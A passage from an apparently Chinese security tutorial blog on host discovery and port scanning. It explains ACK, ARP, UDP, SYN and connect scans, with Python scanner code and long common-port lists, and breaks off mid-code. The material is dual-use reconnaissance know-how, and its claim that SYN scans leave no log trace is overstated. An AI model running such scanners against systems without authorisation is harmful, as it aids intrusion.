结合IP地址前缀构成ip</span></span><br><span class="line">            t = Thread(target=scan, args=(ip,))<span class="comment"># 多线程发送数据包</span></span><br><span class="line">            t.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] The TCP ACK SCAN end&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><strong>缺陷</strong>很容易被基于状态的防火墙过滤，容易误判成非活跃主机。<strong>改进</strong>可以使用 TCP 协议的其他包，例如发 SYN 包，如果选择的端口是开放的，目标主机就会按照 TCP 三次握手的规定，发回一个 SYN/ACK 数据包，表示同意建立连接。如果这个端口关闭，目标主机就会拒绝这次连接，向本机发送一个 RST 数据包。不过这个阶段不在乎端口是否开放，只要收到响应数据包，就表示目标主机活跃。</p><h2 id="arp"><a class="markdownIt-Anchor" href="#arp"></a> arp</h2><p>当目标主机与本机处于同一网段的时候，使用 ARP 协议扫描技术就是最佳的选择。不仅速度最快，扫描结果也是最为精准的。这是因为没有任何安全措施会阻止正常的 ARP 请求。直接使用命令<code>arp -a</code><strong>缺陷</strong>需要与目标主机处于同一网段，条件比较苛刻</p><h2 id="其他方式"><a class="markdownIt-Anchor" href="#其他方式"></a> 其他方式</h2><table><thead><tr><th>协议</th><th>方法</th><th>缺陷</th><th>改进</th></tr></thead><tbody><tr><td>UDP</td><td>当一个 UDP 端口收到一个 UDP 数据包时</td><td></td><td></td></tr></tbody></table><ul><li>若关闭，就会给源端发回一个 ICMP 端口不可达数据包。</li><li>若开放，就会忽略这个数据包，也就是将它丢弃而不返回任何信息。| 扫描结果的可靠性比较低、扫描速度慢需避开常见端口 | 选择值比较大的端口 || SCTP | 四次握手：客户端使用一个 INIT 报文发起一个连接，服务器端使用一个 INIT-ACK 报文进行应答；客户端使用一个 INIT 报文发起一个连接，服务器端使用一个 INIT-ACK 报文进行应答。</li><li>若活跃，目标主机会使用 INIT-ACK 报文进行应答。</li><li>若不可达，则不返回任何信息。| 支持这个协议的主机不多 | 使用其他协议：D || IP | 遍历 IP 协议号，用来确定目标机支持哪些 IP 协议若收到任意响应，则该协议的对应 | 易被检测出发出的数据包内容为空 | 随机填充数据 || DNS | 使用 DNS 逆解析 | 耗时长目标主机需要有域名 | |</li></ul><h1 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h1><h2 id="tcp-syn-扫描半连接"><a class="markdownIt-Anchor" href="#tcp-syn-扫描半连接"></a> TCP SYN 扫描（半连接）</h2><p>本机向目标主机的一个端口发送请求连接的 SYN 数据包，而目标主机在接收到这个 SYN 数据包之后会根据不同情况做出不同应答：</p><table><thead><tr><th>应答</th><th>目标端口状态</th></tr></thead><tbody><tr><td>SYN/ACK</td><td>open</td></tr><tr><td>RST</td><td>closed</td></tr><tr><td>没有应答</td><td>过滤</td></tr><tr><td>icmp 差错报文</td><td>过滤</td></tr></tbody></table><p>目标主机以 SYN/ACK 进行应答，本机可以在收到 SYN/ACK 后会发送 RST 包请求断开连接而不是 ACK 应答。这样，三次握手就没有完成，无法建立正常的 TCP 连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。注意此方法 Linux 中通过 NMAP，需要 root 权限。<strong>缺陷</strong>容易被基于状态的防火墙拦住</p><h2 id="tcp-connect-扫描全连接"><a class="markdownIt-Anchor" href="#tcp-connect-扫描全连接"></a> TCP connect 扫描（全连接）</h2><p>这种扫描方式其实和 SYN 扫描很像，只是这种扫描方式完成了 TCP 的三次握手。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PortScanner</span>(<span class="params">host, port</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        <span class="comment"># AF_INET 服务器之间网络通信</span></span><br><span class="line">        <span class="comment"># SOCK_STREAM 流式socket，for TCP</span></span><br><span class="line">        s.connect((host, port))</span><br><span class="line">        lock.acquire()</span><br><span class="line">        <span class="comment"># 只有一个线程能成功地获取锁</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] PORT: %d open&quot;</span> % port)</span><br><span class="line">        lock.release()</span><br><span class="line">        <span class="comment"># 释放锁</span></span><br><span class="line">        s.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生产按频率排序的端口列表</span></span><br><span class="line">top50_list = [<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">53</span>,<span class="number">80</span>,<span class="number">110</span>,<span class="number">113</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">143</span>,<span class="number">179</span>,<span class="number">199</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">465</span>,<span class="number">514</span>,<span class="number">548</span>,<span class="number">554</span>,<span class="number">587</span>,<span class="number">646</span>,<span class="number">993</span>,<span class="number">995</span>,<span class="number">1025</span>,<span class="number">1026</span>,<span class="number">1433</span>,<span class="number">1720</span>,<span class="number">1723</span>,<span class="number">2000</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">5060</span>,<span class="number">5666</span>,<span class="number">5900</span>,<span class="number">6001</span>,<span class="number">8000</span>,<span class="number">8008</span>,<span class="number">8080</span>,<span class="number">8443</span>,<span class="number">8888</span>,<span class="number">10000</span>,<span class="number">32768</span>,<span class="number">49152</span>,<span class="number">49154</span>]</span><br><span class="line">top100_list = [<span class="number">7</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">25</span>,<span class="number">37</span>,<span class="number">53</span>,<span class="number">79</span>,<span class="number">80</span>,<span class="number">88</span>,<span class="number">106</span>,<span class="number">110</span>,<span class="number">113</span>,<span class="number">119</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">143</span>,<span class="number">179</span>,<span class="number">199</span>,<span class="number">389</span>,<span class="number">427</span>,<span class="number">443</span>,<span class="number">444</span>,<span class="number">465</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">543</span>,<span class="number">548</span>,<span class="number">554</span>,<span class="number">587</span>,<span class="number">631</span>,<span class="number">646</span>,<span class="number">873</span>,<span class="number">990</span>,<span class="number">993</span>,<span class="number">995</span>,<span class="number">1025</span>,<span class="number">1026</span>,<span class="number">1027</span>,<span class="number">1028</span>,<span class="number">1110</span>,<span class="number">1433</span>,<span class="number">1720</span>,<span class="number">1723</span>,<span class="number">1755</span>,<span class="number">1900</span>,<span class="number">2000</span>,<span class="number">2049</span>,<span class="number">2121</span>,<span class="number">2717</span>,<span class="number">3000</span>,<span class="number">3128</span>,<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">3986</span>,<span class="number">4899</span>,<span class="number">5000</span>,<span class="number">5009</span>,<span class="number">5051</span>,<span class="number">5060</span>,<span class="number">5101</span>,<span class="number">5190</span>,<span class="number">5357</span>,<span class="number">5432</span>,<span class="number">5631</span>,<span class="number">5666</span>,<span class="number">5800</span>,<span class="number">5900</span>,<span class="number">6000</span>,<span class="number">6646</span>,<span class="number">7070</span>,<span class="number">8000</span>,<span class="number">8008</span>,<span class="number">8080</span>,<span class="number">8443</span>,<span class="number">8888</span>,<span class="number">9100</span>,<span class="number">9999</span>,<span class="number">32768</span>,<span class="number">49152</span>,<span class="number">49153</span>,<span class="number">49154</span>,<span class="number">49155</span>,<span class="number">49156</span>]</span><br><span class="line">top1000_list = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">9</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">30</span>,<span class="number">32</span>,<span class="number">37</span>,<span class="number">42</span>,<span class="number">49</span>,<span class="number">53</span>,<span class="number">70</span>,<span class="number">79</span>,<span class="number">80</span>,<span class="number">81</span>,<span class="number">82</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">88</span>,<span class="number">89</span>,<span class="number">99</span>,<span class="number">106</span>,<span class="number">109</span>,<span class="number">110</span>,<span class="number">113</span>,<span class="number">119</span>,<span class="number">125</span>,<span class="number">135</span>,<span class="number">139</span>,<span class="number">143</span>,<span class="number">146</span>,<span class="number">161</span>,<span class="number">163</span>,<span class="number">179</span>,<span class="number">199</span>,<span class="number">211</span>,<span class="number">222</span>,<span class="number">254</span>,<span class="number">255</span>,<span class="number">259</span>,<span class="number">264</span>,<span class="number">280</span>,<span class="number">301</span>,<span class="number">306</span>,<span class="number">311</span>,<span class="number">340</span>,<span class="number">366</span>,<span class="number">389</span>,<span class="number">406</span>,<span class="number">416</span>,<span class="number">425</span>,<span class="number">427</span>,<span class="number">443</span>,<span class="number">444</span>,<span class="number">458</span>,<span class="number">464</span>,<span class="number">481</span>,<span class="number">497</span>,<span class="number">500</span>,<span class="number">512</span>,<span class="number">513</span>,<span class="number">514</span>,<span class="number">524</span>,<span class="number">541</span>,<span class="number">543</span>,<span class="number">544</span>,<span class="number">548</span>,<span class="number">554</span>,<span class="number">563</span>,<span class="number">587</span>,<span class="number">593</span>,<span class="number">616</span>,<span class="number">625</span>,<span class="number">631</span>,<span class="number">636</span>,<span class="number">646</span>,<span class="number">648</span>,<span class="number">666</span>,<span class="number">667</span>,<span class="number">683</span>,<span class="number">687</span>,<span class="number">691</span>,<span class="number">700</span>,<span class="number">705</span>,<span class="number">711</span>,<span class="number">714</span>,<span class="number">720</span>,<span class="number">722</span>,<span class="number">726</span>,<span class="number">749</span>,<span class="number">765</span>,<span class="number">777</span>,<span class="number">783</span>,<span class="number">787</span>,<span class="number">800</span>,<span class="number">808</span>,<span class="number">843</span>,<span class="number">873</span>,<span class="number">880</span>,<span class="number">888</span>,<span class="number">898</span>,<span class="number">900</span>,<span class="number">901</span>,<span class="number">902</span>,<span class="number">911</span>,<span class="number">981</span>,<span class="number">987</span>,<span class="number">990</span>,<span class="number">992</span>,<span class="number">995</span>,<span class="number">999</span>,<span class="number">1000</span>,<span class="number">1001</span>,<span class="number">1007</span>,<span class="number">1009</span>,<span class="number">1010</span>,<span class="number">1021</span>,<span class="number">1022</span>,<span class="number">1023</span>,<span class="number">1024</span>,<span class="number">1025</span>,<span class="number">1026</span>,<span class="number">1027</span>,<span class="number">1028</span>,<span class="number">1029</span>,<span class="number">1030</span>,<span class="number">1031</span>,<span class="number">1032</span>,<span class="number">1033</span>,<span class="number">1034</span>,<span class="number">1035</span>,<span class="number">1036</span>,<span class="number">1037</span>,<span class="number">1038</span>,<span class="number">1039</span>,<span class="number">1040</span>,<span class="number">1041</span>,<span class="number">1042</span>,<span class="number">1043</span>,<span class="number">1044</span>,<span class="number">1045</span>,<span class="number">1046</span>,<span class="number">1047</span>,<span class="number">1048</span>,<span class="number">1049</span>,<span class="number">1050</span>,<span class="number">1051</span>,<span class="number">1052</span>,<span class="number">1053</span>,<span class="number">1054</span>,<span class="number">1055</span>,<span class="number">1056</span>,<span class="number">1057</span>,<span class="number">1058</span>,<span class="number">1059</span>,<span class="number">1060</span>,<span class="number">1061</span>,<span class="number">1062</span>,<span class="number">1063</span>,<span class="number">1064</span>,<span class="number">1065</span>,<span class="number">1066</span>,<span class="number">1067</span>,<span class="number">1068</span>,<span class="number">1069</span>,<span class="number">1070</span>,<span class="number">1071</span>,<span class="number">1072</span>,<span class="number">1073</span>,<span class="number">1074</span>,<span class="number">1075</span>,<span class="number">1076</span>,<span class="number">1077</span>,<span class="number">1078</span>,<span class="number">1079</span>,<span class="number">1080</span>,<span class="number">1081</span>,<span class="number">1082</span>,<span class="number">1083</span>,<span class="number">1084</span>,<span class="number">1085</span>,<span class="number">1086</span>,<span class="number">1087</span>,<span class="number">1088</span>,<span class="number">1089</span>,<span class="number">1090</span>,<span class="number">1091</span>,<span class="number">1092</span>,<span class="number">1093</span>,<span class="number">1094</span>,<span class="number">1095</span>,<span class="number">1096</span>,<span class="number">1097</span>,<span class="number">1098</span>,<span class="number">1099</span>,<span class="number">1102</span>,<span class="number">1104</span>,<span class="number">1105</span>,<span class="number">1106</span>,<span class="number">1107</span>,<span class="number">1110</span>,<span class="number">1111</span>,<span class="number">1112</span>,<span class="number">1113</span>,<span class="number">1117</span>,<span class="number">1119</span>,<span class="number">1121</span>,<span class="number">1122</span>,<span class="number">1123</span>,<span class="number">1126</span>,<span class="number">1130</span>,<span class="number">1131</span>,<span class="number">1137</span>,<span class="number">1141</span>,<span class="number">1145</span>,<span class="number">1147</span>,<span class="number">1148</span>,<span class="number">1151</span>,<span class="number">1154</span>,<span class="number">1163</span>,<span class="number">1164</span>,<span class="number">1165</span>,<span class="number">1169</span>,<span class="number">1174</span>,<span class="number">1183</span>,<span class="number">1185</span>,<span class="number">1186</span>,<span class="number">1192</span>,<span class="number">1198</span>,<span class="number">1201</span>,<span class="number">1213</span>,<span class="number">1216</span>,<span class="number">1217</span>,<span class="number">1233</span>,<span class="number">1236</span>,<span class="number">1244</span>,<span class="number">1247</span>,<span class="number">1259</span>,<span class="number">1271</span>,<span class="number">1277</span>,<span class="number">1287</span>,<span class="number">1296</span>,<span class="number">1300</span>,<span class="number">1309</span>,<span class="number">1310</span>,<span class="number">1322</span>,<span class="number">1328</span>,<span class="number">1334</span>,<span class="number">1352</span>,<span class="number">1417</span>,<span class="number">1433</span>,<span class="number">1443</span>,<span class="number">1455</span>,<span class="number">1461</span>,<span class="number">1494</span>,<span class="number">1500</span>,<span class="number">1503</span>,<span class="number">1521</span>,<span class="number">1524</span>,<span class="number">1533</span>,<span class="number">1556</span>,<span class="number">1580</span>,<span class="number">1583</span>,<span class="number">1594</span>,<span class="number">1600</span>,<span class="number">1641</span>,<span class="number">1658</span>,<span class="number">1666</span>,<span class="number">1687</span>,<span class="number">1700</span>,<span class="number">1717</span>,<span class="number">1718</span>,<span class="number">1719</span>,<span class="number">1720</span>,<span class="number">1723</span>,<span class="number">1755</span>,<span class="number">1761</span>,<span class="number">1782</span>,<span class="number">1801</span>,<span class="number">1805</span>,<span class="number">1812</span>,<span class="number">1839</span>,<span class="number">1862</span>,<span class="number">1863</span>,<span class="number">1875</span>,<span class="number">1900</span>,<span class="number">1914</span>,<span class="number">1935</span>,<span class="number">1947</span>,<span class="number">1971</span>,<span class="number">1974</span>,<span class="number">1984</span>,<span class="number">1998</span>,<span class="number">1999</span>,<span class="number">2000</span>,<span class="number">2001</span>,<span class="number">2002</span>,<span class="number">2003</span>,<span class="number">2004</span>,<span class="number">2005</span>,<span class="number">2006</span>,<span class="number">2007</span>,<span class="number">2008</span>,<span class="number">2009</span>,<span class="number">2013</span>,<span class="number">2020</span>,<span class="number">2021</span>,<span class="number">2030</span>,<span class="number">2033</span>,<span class="number">2034</span>,<span class="number">2038</span>,<span class="number">2040</span>,<span class="number">2041</span>,<span class="number">2042</span>,<span class="number">2045</span>,<span class="number">2046</span>,<span class="number">2047</span>,<span class="number">2048</span>,<span class="number">2065</span>,<span class="number">2068</span>,<span class="number">2099</span>,<span class="number">2103</span>,<span class="number">2105</span>,<span class="number">2106</span>,<span class="number">2111</span>,<span class="number">2119</span>,<span class="number">2121</span>,<span class="number">2126</span>,<span class="number">2135</span>,<span class="number">2144</span>,<span class="number">2160</span>,<span class="number">2170</span>,<span class="number">2179</span>,<span class="number">2190</span>,<span class="number">2196</span>,<span class="number">2200</span>,<span class="number">2222</span>,<span class="number">2251</span>,<span class="number">2260</span>,<span class="number">2288</span>,<span class="number">2301</span>,<span class="number">2323</span>,<span class="number">2366</span>,<span class="number">2381</span>,<span class="number">2382</span>,<span class="number">2393</span>,<span class="number">2399</span>,<span class="number">2401</span>,<span class="number">2492</span>,<span class="number">2500</span>,<span class="number">2522</span>,<span class="number">2525</span>,<span class="number">2557</span>,<span class="number">2601</span>,<span class="number">2604</span>,<span class="number">2607</span>,<span class="number">2638</span>,<span class="number">2701</span>,<span class="number">2710</span>,<span class="number">2717</span>,<span class="number">2725</span>,<span class="number">2800</span>,<span class="number">2809</span>,<span class="number">2811</span>,<span class="number">2869</span>,<span class="number">2875</span>,<span class="number">2909</span>,<span class="number">2920</span>,<span class="number">2967</span>,<span class="number">2998</span>,<span class="number">3000</span>,<span class="number">3003</span>,<span class="number">3005</span>,<span class="number">3006</span>,<span class="number">3011</span>,<span class="number">3013</span>,<span class="number">3017</span>,<span class="number">3030</span>,<span class="number">3052</span>,<span class="number">3071</span>,<span class="number">3077</span>,<span class="number">3128</span>,<span class="number">3168</span>,<span class="number">3211</span>,<span class="number">3221</span>,<span class="number">3260</span>,<span class="number">3268</span>,<span class="number">3283</span>,<span class="number">3300</span>,<span class="number">3306</span>,<span class="number">3322</span>,<span class="number">3323</span>,<span class="number">3324</span>,<span class="number">3333</span>,<span class="number">3351</span>,<span class="number">3367</span>,<span class="number">3369</span>,<span class="number">3370</span>,<span class="number">3371</span>,<span class="number">3389</span>,<span class="number">3404</span>,<span class="number">3476</span>,<span class="number">3493</span>,<span class="number">3517</span>,<span class="number">3527</span>,<span class="number">3546</span>,<span class="number">3551</span>,<span class="number">3580</span>,<span class="number">3659</span>,<span class="number">3689</span>,<span class="number">3703</span>,<span class="number">3737</span>,<span class="number">3766</span>,<span class="number">3784</span>,<span class="number">3800</span>,<span class="number">3809</span>,<span class="number">3814</span>,<span class="number">3826</span>,<span class="number">3827</span>,<span class="number">3851</span>,<span class="number">3869</span>,<span class="number">3871</span>,<span class="number">3878</span>,<span class="number">3880</span>,<span class="number">3889</span>,<span class="number">3905</span>,<span class="number">3914</span>,<span class="number">3918</span>,<span class="number">3920</span>,<span class="number">3945</span>,<span class="number">3971</span>,<span class="number">3986</span>,<span class="number">3995</span>,<span class="number">3998</span>,<span class="number">4000</span>,<span class="number">4001</span>,<span class="number">4002</span>,<span class="number">4003</span>,<span class="number">4004</span>,<span class="number">4005</span>,<span class="number">4045</span>,<span class="number">4111</span>,<span class="number">4125</span>,<span class="number">4129</span>,<span class="number">4224</span>,<span class="number">4242</span>,<span class="number">4279</span>,<span class="number">4321</span>,<span class="number">4343</span>,<span class="number">4443</span>,<span class="number">4444</span>,<span class="number">4445</span>,<span class="number">4449</span>,<span class="number">4550</span>,<span class="number">4567</span>,<span class="number">4662</span>,<span class="number">4848</span>,<span class="number">4899</span>,<span class="number">4998</span>,<span class="number">5000</span>,<span class="number">5001</span>,<span class="number">5002</span>,<span class="number">5003</span>,<span class="number">5009</span>,<span class="number">5030</span>,<span class="number">5033</span>,<span class="number">5050</span>,<span class="number">5054</span>,<span class="number">5060</span>,<span class="number">5080</span>,<span class="number">5087</span>,<span class="number">5100</span>,<span class="number">5101</span>,<span class="number">5120</span>,<span class="number">5190</span>,<span class="number">5200</span>,<span class="number">5214</span>,<span class="number">5221</span>,<span class="number">5225</span>,<span class="number">5269</span>,<span class="number">5280</span>,<span class="number">5298</span>,<span class="number">5357</span>,<span class="number">5405</span>,<span class="number">5414</span>,<span class="number">5431</span>,<span class="number">5440</span>,<span class="number">5500</span>,<span class="number">5510</span>,<span class="number">5544</span>,<span class="number">5550</span>,<span class="number">5555</span>,<span class="number">5560</span>,<span class="number">5566</span>,<span class="number">5631</span>,<span class="number">5633</span>,<span class="number">5666</span>,<span class="number">5678</span>,<span class="number">5718</span>,<span class="number">5730</span>,<span class="number">5800</span>,<span class="number">5801</span>,<span class="number">5810</span>,<span class="number">5815</span>,<span class="number">5822</span>,<span class="number">5825</span>,<span class="number">5850</span>,<span class="number">5859</span>,<span class="number">5862</span>,<span class="number">5877</span>,<span class="number">5900</span>,<span class="number">5901</span>,<span class="number">5902</span>,<span class="number">5903</span>,<span class="number">5906</span>,<span class="number">5910</span>,<span class="number">5915</span>,<span class="number">5922</span>,<span class="number">5925</span>,<span class="number">5950</span>,<span class="number">5952</span>,<span class="number">5959</span>,<span class="number">5960</span>,<span class="number">5961</span>,<span class="number">5962</span>,<span class="number">5987</span>,<span class="number">5988</span>,<span class="number">5998</span>,<span class="number">5999</span>,<span class="number">6000</span>,<span class="number">6001</span>,<span class="number">6002</span>,<span class="number">6003</span>,<span class="number">6004</span>,<span class="number">6005</span>,<span class="number">6006</span>,<span class="number">6009</span>,<span class="number">6025</span>,<span class="number">6059</span>,<span class="number">6100</span>,<span class="number">6106</span>,<span class="number">6112</span>,<span class="number">6123</span>,<span class="number">6129</span>,<span class="number">6156</span>,<span class="number">6346</span>,<span class="number">6389</span>,<span class="number">6502</span>,<span class="number">6510</span>,<span class="number">6543</span>,<span class="number">6547</span>,<span class="number">6565</span>,<span class="number">6566</span>,<span class="number">6580</span>,<span class="number">6646</span>,<span class="number">6666</span>,<span class="number">6667</span>,<span class="number">6668</span>,<span class="number">6689</span>,<span class="number">6692</span>,<span class="number">6699</span>,<span class="number">6779</span>,<span class="number">6788</span>,<span class="number">6792</span>,<span class="number">6839</span>,<span class="number">6881</span>,<span class="number">6901</span>,<span class="number">6969</span>,<span class="number">7000</span>,<span class="number">7001</span>,<span class="number">7004</span>,<span class="number">7007</span>,<span class="number">7019</span>,<span class="number">7025</span>,<span class="number">7070</span>,<span class="number">7100</span>,<span class="number">7103</span>,<span class="number">7106</span>,<span class="number">7200</span>,<span class="number">7402</span>,<span class="number">7435</span>,<span class="number">7443</span>,<span class="number">7496</span>,<span class="number">7512</span>,<span class="number">7625</span>,<span class="number">7627</span>,<span class="number">7676</span>,<span class="number">7741</span>,<span class="number">7777</span>,<span class="number">7800</span>,<span class="number">7911</span>,<span class="number">7920</span>,<span class="number">7937</span>,<span class="number">7999</span>,<span class="number">8000</span>,<span class="number">8001</span>,<span class="number">8007</span>,<span class="number">8008</span>,<span class="number">8009</span>,<span class="number">8010</span>,<span class="number">8021</span>,<span class="number">8031</span>,<span class="number">8042</span>,<span class="number">8045</span>,<span class="number">8080</span>,<span class="number">8081</span>,<span class="number">8082</span>,<span class="number">8083</span>,<span class="number">8084</span>,<span class="number">8085</span>,<span class="number">8086</span>,<span class="number">8087</span>,<span class="number">8088</span>,<span class="number">8089</span>,<span class="number">8093</span>,<span class="number">8099</span>,<span class="number">8180</span>,<span class="number">8192</span>,<span class="number">8193</span>,<span class="number">8200</span>,<span class="number">8222</span>,<span class="number">8254</span>,<span class="number">8290</span>,<span class="number">8291</span>,<span class="number">8300</span>,<span class="number">8333</span>,<span class="number">8383</span>,<span class="number">8400</span>,<span class="number">8402</span>,<span class="number">8443</span>,<span class="number">8500</span>,<span class="number">8600</span>,<span class="number">8649</span>,<span class="number">8651</span>,<span class="number">8654</span>,<span class="number">8701</span>,<span class="number">8800</span>,<span class="number">8873</span>,<span class="number">8888</span>,<span class="number">8899</span>,<span class="number">8994</span>,<span class="number">9000</span>,<span class="number">9001</span>,<span class="number">9002</span>,<span class="number">9009</span>,<span class="number">9010</span>,<span class="number">9040</span>,<span class="number">9050</span>,<span class="number">9071</span>,<span class="number">9080</span>,<span class="number">9090</span>,<span class="number">9099</span>,<span class="number">9100</span>,<span class="number">9101</span>,<span class="number">9102</span>,<span class="number">9110</span>,<span class="number">9200</span>,<span class="number">9207</span>,<span class="number">9220</span>,<span class="number">9290</span>,<span class="number">9415</span>,<span class="number">9418</span>,<span class="number">9485</span>,<span class="number">9500</span>,<span class="number">9502</span>,<span class="number">9535</span>,<span class="number">9575</span>,<span class="number">9593</span>,<span class="number">9594</span>,<span class="number">9618</span>,<span class="number">9666</span>,<span class="number">9876</span>,<span class="number">9877</span>,<span class="number">9898</span>,<span class="number">9900</span>,<span class="number">9917</span>,<span class="number">9929</span>,<span class="number">9943</span>,<span class="number">9968</span>,<span class="number">9998</span>,<span class="number">9999</span>,<span class="number">10000</span>,<span class="number">10001</span>,<span class="number">10002</span>,<span class="number">10003</span>,<span class="number">10009</span>,<span class="number">10012</span>,<span class="number">10024</span>,<span class="number">10082</span>,<span class="number">10180</span>,<span class="number">10215</span>,<span class="number">10243</span>,<span class="number">10566</span>,<span class="number">10616</span>,<span class="number">10621</span>,<span class="number">10626</span>,<span class="number">10628</span>,<span class="number">10778</span>,<span class="number">11110</span>,<span class="number">11967</span>,<span class="number">12000</span>,<span class="number">12174</span>,<span class="number">12265</span>,<span class="number">12345</span>,<span class="number">13456</span>,<span class="number">13722</span>,<span class="number">13782</span>,<span class="number">14000</span>,<span class="number">14238</span>,<span class="number">14441</span>,<span class="number">15000</span>,<span class="number">15002</span>,<span class="number">15003</span>,<span class="number">15660</span>,<span class="number">15742</span>,<span class="number">16000</span>,<span class="number">16012</span>,<span class="number">16016</span>,<span class="number">16018</span>,<span class="number">16080</span>,<span class="number">16113</span>,<span class="number">16992</span>,<span class="number">17877</span>,<span class="number">17988</span>,<span class="number">18040</span>,<span class="number">18101</span>,<span class="number">18988</span>,<span class="number">19101</span>,<span class="number">19283</span>,<span class="number">19315</span>,<span class="number">19350</span>,<span class="number">19780</span>,<span class="number">19801</span>,<span class="number">19842</span>,<span class="number">20000</span>,<span class="number">20005</span>,<span class="number">20031</span>,<span class="number">20221</span>,<span class="number">20828</span>,<span class="number">21571</span>,<span class="number">22939</span>,<span class="number">23502</span>,<span class="number">24444</span>,<span class="number">24800</span>,<span class="number">25734</span>,<span class="number">26214</span>,<span class="number">27000</span>,<span class="number">27352</span>,<span class="number">27355</span>,<span class="number">27715</span>,<span class="number">28201</span>,<span class="number">30000</span>,<span class="number">30718</span>,<span class="number">30951</span>,<span class="number">31038</span>,<span class="number">31337</span>,<span class="number">32768</span>,<span class="number">32769</span>,<span class="number">32770</span>,<span class="number">32771</span>,<span class="number">32772</span>,<span class="number">32773</span>,<span class="number">32774</span>,<span class="number">32775</span>,<span class="number">32776</span>,<span class="number">32777</span>,<span class="number">32778</span>,<span class="number">32779</span>,<span class="number">32780</span>,<span class="number">32781</span>,<span class="number">32782</span>,<span class="number">32783</span>,<span class="number">32784</span>,<span class="number">33354</span>,<span class="number">33899</span>,<span class="number">34571</span>,<span class="number">34572</span>,<span class="number">35500</span>,<span class="number">38292</span>,<span class="number">40193</span>,<span class="number">40911</span>,<span class="number">41511</span>,<span class="number">42510</span>,<span class="number">44176</span>,<span class="number">44442</span>,<span class="number">44501</span>,<span class="number">45100</span>,<span class="number">48080</span>,<span class="number">49152</span>,<span class="number">49153</span>,<span class="number">49154</span>,<span class="number">49155</span>,<span class="number">49156</span>,<span class="number">49157</span>,<span class="number">49158</span>,<span class="number">49159</span>,<span class="number">49160</span>,<span class="number">49163</span>,<span class="number">49165</span>,<span class="number">49167</span>,<span class="number">49175</span>,<span class="number">49400</span>,<span class="number">49999</span>,<span class="number">50000</span>,<span class="number">50001</span>,<span class="number">50002</span>,<span class="number">50006</span>,<span class="number">50300</span>,<span class="number">50389</span>,<span class="number">50500</span>,<span class="number">50636</span>,<span class="number">50800</span>,<span class="number">51103</span>,<span class="number">51493</span>,<span class="number">52673</span>,<span class="number">52822</span>,<span class="number">52848</span>,<span class="number">52869</span>,<span class="number">54045</span>,<span class="number">54328</span>,<span class="number">55055</span>,<span class="number">55555</span>,<span class="number">55600</span>,<span class="number">56737</span>,<span class="number">57294</span>,<span class="number">57797</span>,<span class="number">58080</span>,<span class="number">60020</span>,<span class="number">60443</span>,<span class="number">61532</span>,<span class="number">61900</span>,<span class="number">62078</span>,<span class="number">63331</span>,<span class="number">64623</span>,<span class="number">64680</span>,<span class="number">65000</span>,<span class="number">65129</span>,<span class="number">65389</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">defualt_port=top50_list+top100_list+top1000_list</span><br><span class="line">port_set=<span class="built_in">set</span>(defualt_port)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65535</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span 